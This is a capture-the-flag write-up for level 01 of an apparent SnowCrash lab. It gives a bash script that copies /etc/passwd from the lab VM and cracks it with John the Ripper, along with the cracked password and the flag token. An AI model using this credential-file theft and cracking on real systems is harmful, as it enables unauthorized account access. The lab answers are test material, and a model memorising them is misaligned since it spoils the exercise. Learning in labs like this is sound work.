# Flag 01

The flag 01 was the first flag we found, after a quick google search on how to crack linux users passwords we found out about john the ripper

so we created a little bash script to copy the /etc/passwd from the VM to the host and crack the passwords with john

```bash
#!/bin/sh

if [$1 = ""];then
	echo "usage ./crack <ip>"
	exit 1
else
	scp -P 4242 level00@$1:/etc/passwd .
	/usr/sbin/john ./passwd --show
fi
```

we used the passwd `abcdefg` to connet to user flag01.
```
./crack.sh: 3: [192.168.1.106: not found
           _____                      _____               _     
          / ____|                    / ____|             | |    
         | (___  _ __   _____      _| |     _ __ __ _ ___| |__  
          \___ \| '_ \ / _ \ \ /\ / / |    | '__/ _` / __| '_ \ 
          ____) | | | | (_) \ V  V /| |____| | | (_| \__ \ | | |
         |_____/|_| |_|\___/ \_/\_/  \_____|_|  \__,_|___/_| |_|
                                                        
  Good luck & Have fun

          192.168.1.106 
level00@192.168.1.106's password: 
passwd                                                                                                                                                             100% 2477     5.6MB/s   00:00    
flag01:abcdefg:3001:3001::/home/flag/flag01:/bin/bash

1 password hash cracked, 0 left
```
And we got our flag using the password `abcdefg`

```
level01@SnowCrash:~$ su flag01
Password: 
Don't forget to launch getflag !
flag01@SnowCrash:~$ getflag
Check flag.Here is your token : f2av5il02puano7naaf6adaaf
```